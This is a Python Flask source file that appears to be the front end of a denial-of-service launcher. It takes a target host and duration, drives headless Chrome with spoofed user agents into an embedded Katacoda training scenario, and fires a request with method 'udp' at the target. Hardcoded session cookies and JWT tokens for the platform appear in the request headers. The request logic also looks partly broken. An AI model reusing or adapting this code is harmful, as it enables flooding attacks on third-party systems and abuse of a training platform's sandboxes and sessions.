from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
from flask import Flask, render_template
from flask import request
import requests
import time
import os
app = Flask(__name__)


@app.route('/')
def index():
  host = request.args.get('host')
  length = request.args.get('length')
  if host == None:
    print("Please fill out the required!");
  else:
    print(host);
  if length == None:
    print("Please fill out the required!");
  else:
    print(length);
    execute();
  return '{Executer: Online}'
def execute():
  host = request.args.get('host')
  length = request.args.get('length')
  method = 'udp';
  CHROMEDRIVER_PATH = os.environ.get('CHROMEDRIVER_PATH', '/usr/local/bin/chromedriver')
  GOOGLE_CHROME_BIN = os.environ.get('GOOGLE_CHROME_BIN', '/usr/bin/google-chrome')
  options = Options()
  options.binary_location = GOOGLE_CHROME_BIN
  options.add_argument('--disable-gpu')
  options.add_argument('--no-sandbox')
  options.add_argument("--disable-dev-shm-usage")
  options.add_argument("--headless")
  ua = UserAgent()
  userAgent = ua.random
  print(userAgent)
  options.add_argument(f'user-agent={userAgent}')
  driver = webdriver.Chrome(executable_path=CHROMEDRIVER_PATH , chrome_options=options)
  driver.get("https://katacoda.com/embed/runpatrick/courses/challenges/node-challenge-1/?v=2&embed=true&ui=inline&host=137.184.30.68&url=http%3A%2F%2F137.184.30.68%2Ftest%2F%3Fhost%3D1&target=katacoda-scenario-1&nonce=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWJlZCI6dHJ1ZSwiZG9tYWluIjoiaHR0cDovLzEzNy4xODQuMzAuNjgvIiwiaXAiOiIyNC4yMjguMTA5LjI1NSIsImlhdCI6MTYzMTg2NTgzMiwiZXhwIjoxNjMxODY1ODYyfQ.DA-Sa33cRPy1IrloJNxqvIs37wotHl6KdSgyzCNYNPg&color=004d7f")
  time.sleep(7)
  url = driver.execute_script("return document.getElementById('weburl').innerText;")
  print(url)
  headers = {
      'authority': '2886795297-80-simba08.environments.katacoda.com',
      'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"',
      'upgrade-insecure-requests': '1',
      'user-agent': userAgent,
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'sec-fetch-site': 'none',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-user': '?1',
      'sec-fetch-dest': 'document',
      'accept-language': 'en-US,en;q=0.9',
      'cookie': '_ga=GA1.2.785139621.1628830169; _gid=GA1.2.61981207.1631627526; mp_asdbc_mixpanel=%7B%22distinct_id%22%3A%20%2217bedc91bee157e-0684fa509cf409-1f3e6757-13c680-17bedc91bef17ed%22%2C%22%24device_id%22%3A%20%2217bedc91bee157e-0684fa509cf409-1f3e6757-13c680-17bedc91bef17ed%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.katacoda.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.katacoda.com%22%7D; connect.sid=s%3AZt9LnJrrFN0Uz3Uo3yDIE7Q0oObj5yEB.5pe365NRxOLaQGuhnVEYyp25Gk65xFPbG%2Fp%2BGf49lUc; _gat=1; kc-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7fSwiY2xpZW50SVAiOiIyMTYuNi4xNzcuMjM5IiwiZW52Ijp7Im5hbWUiOiJzdF80eXFzbW9id3NfRzUzVmVUMTlxcUdUMU9YN0FBZUwiLCJrYXRhY29kYUhvc3QiOiJzaW1iYTA4IiwiaG9zdHMiOlt7InR5cGUiOiJjbGllbnQiLCJuYW1lIjoiIiwiaXAiOiIxNzIuMTcuMC4zMyIsInN1YmRvbWFpbiI6Mjg4Njc5NTI5Nywia2F0YWNvZGFob3N0Ijoic2ltYmEwOCJ9XX0sImlhdCI6MTYzMjAyOTI0NSwiZXhwIjoxNjMyMDMyODQ1fQ.Df5W35dfqDniTHs1-ULpFK2Vc8n7XYWfOC7ud9aygsg',
  }

  params = (
      ('host', host),
      ('method', method),
      ('length', length),
  )

  response = requests.get(host, headers=headers, params=params)
  time.sleep(40)
